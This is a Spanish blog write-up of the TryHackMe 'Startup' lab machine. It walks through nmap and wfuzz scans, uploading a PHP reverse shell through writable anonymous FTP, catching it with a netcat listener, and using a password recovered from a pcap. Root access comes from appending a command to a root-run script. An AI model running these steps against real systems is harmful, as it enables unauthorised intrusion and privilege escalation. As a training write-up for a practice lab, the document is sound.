---
layout: single
title: Startup - Try Hack Me
excerpt: "Estamos frente a una máquina Linux, tenemos acceso al servicio FTP con el usuario anonymous, 
podremos subir una reverse-shell al servidor FTP porque tenemos permisos de escritura, lectura y ejecución
para si obtener la intrusión de la máquina, una vez dentro tendrémos que realizar un user pivoting para posteriormente
obtener la flag de root mediante un fichero en bash."
date: 2021-09-18
classes: wide
header:
  teaser: /assets/images/thm-writeup-startup/spicy.png
  teaser_home_page: true
  icon: /assets/images/thm.png
categories:
  - tryhackme
  - linux
tags:
  - tryhackme
  - reverse-shell
  - bash
---

## Linux / 10.10.186.208 
### Abusar de las vulnerabilidades tradicionales a través de medios no tradicionales.

### Escaneo de puertos abiertos
```
❯ nmap -p- --open -T5 -v -n 10.10.186.208 -oG puertos
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### Escaneo de servicios
```
❯ nmap -sC -sV -p 21,22,80 10.10.186.208 -oN servicios
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.154.249
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```
Nos descargamos notice.txt y important.jpg... pero no obtenemos nada que sea de utilidad.

Al visitar la web vemos el siguiente mensaje:

> No spice here!
Please excuse us as we develop our site. We want to make it the most stylish and convienient way to buy peppers. Plus, we need a web developer. BTW if you're a web developer, contact us. Otherwise, don't you worry. We'll be online shortly!
Dev Team

### Fuzzing
```
❯ wfuzz -c -t 100 --hc=404 -w /opt/w/common.txt http://10.10.186.208/FUZZ`
/files
```

Navegamos hasta el directorio `/file` y vemos los siguientes archivos:

![](/assets/images/thm-writeup-startup/files.png)

Són los mismos archivos que hay en el servidor ftp, en la carpeta ftp tenemos permisos de lectura escritura y ejecución.
No descargamos una reverse shell.
 
```
❯ wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
```

Descomprimimos nuestra shell.

```
❯ tar xzvf php-reverse-shell-1.0.tar.gz
```

Configuramos nuestra shell con nuestra ip de atacante.

![](/assets/images/thm-writeup-startup/reverseconf.png)

Nos conectamos de nuevo al FTP, nos vamos al directorio `/ftp` y subimos el fichero.php.

```
put php-reverse-shell.php
```

Nos vamos al navegador web al directorio `/files/ftp` y nos aparace nuestra shell.

![](/assets/images/thm-writeup-startup/php-reverse.png)

Ponemos un netcat a la escucha para obtener nuestra querida shell.

```
❯ nc -lvnp 1234
```

Volvemos al directorio `/files/ftp` de la página web, hacemos click en `php-reverse-shell.php` y nos devolverá una shell.

![](/assets/images/thm-writeup-startup/www-data.png)

### Tratamiento TTY

Configuramos nuestra shell para tener una terminal interactiva y funcional.

```
script /dev/null -c bash
control+z
stty raw -echo;fg
reset
xterm
export TERM=xterm
export SHELL=bash
```


### User Pivoting

Lanzamos un ls -la y vemos un archivo "recipe.txt" este nos dice el ingrediente secreto "love" que necesitamos para la web de THM y luego tenemos
un directorio llamado `/incident` dentro un archivo llamado `suspicious.pcapng`.

Lo descargamos y lo analizamos con wireshark, filtramos por http, seguimos el flujo tcp y encontraremos un login fallido con el user www-data y una contraseña.

![](/assets/images/thm-writeup-startup/pcapPasswd.png)

`lennie: c4ntg3t3n0ughsp1c3`

`su lennie`

Probamos la passwd con el usuario lennie y ahora ya podemos leer `user.txt`.

Usamos cat para leer el user.txt: `cat user.txt`
 
THM{03cXXXXXXXXXXXXXXXXXXXXXXXXXXe79}

### Privesc
Desde el home de lennie lanzamos un `ls -laR`
```
./Documents:
-rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
-rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
-rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt

./scripts:
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Aug 19 14:23 startup_list.txt
```
### Fichero planner.sh
Veamos que contiene: `cat planner.sh` 
```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```
### Fichero print.sh
Miramos el contenido del siguiente archivo: `cat /etc/print.sh`
```bash
#!/bin/bash
echo "Done!"
```
### Fichero startup_list.txt
Fichero vacío

### Fichero concern.txt
`cat concern.txt` 
> I got banned from your library for moving the "C programming language" book into the horror section. Is there a way I can appeal? --Lennie
> Me han expulsado de su biblioteca por mover el libro "Lenguaje de programación C" a la sección de terror. ¿Hay alguna forma de apelar? -Lennie

### Fichero list.txt
`cat list.txt`

`Shoppinglist: Cyberpunk 2077 | Milk | Dog food`

### Fichero note.txt
`cat note.txt `
> Reminders: Talk to Inclinant about our lacking security, hire a web developer, delete incident logs.
> Recordatorios: Habla con Inclinant sobre nuestra falta de seguridad, contrata a un desarrollador web, borra los registros de incidencias.

El archivo print.sh tiene permisos de escritura

`echo 'cat /root/root.txt > /home/lennie/root.txt' >> /etc/print.sh`

Comprobamos que el fichero print.sh se ha modificado

`cat /etc/print.sh`
```bash
#!/bin/bash
echo "Done!"
cat /root/root.txt > /home/lennie/root.txt
```

Esperamos unos segundos y nos aparecerá el fichero root.txt en el home de lennie

Lanzamos un: `cat root.txt`

THM{f96XXXXXXXXXXXXXXXXXXXXXXXXX76d}
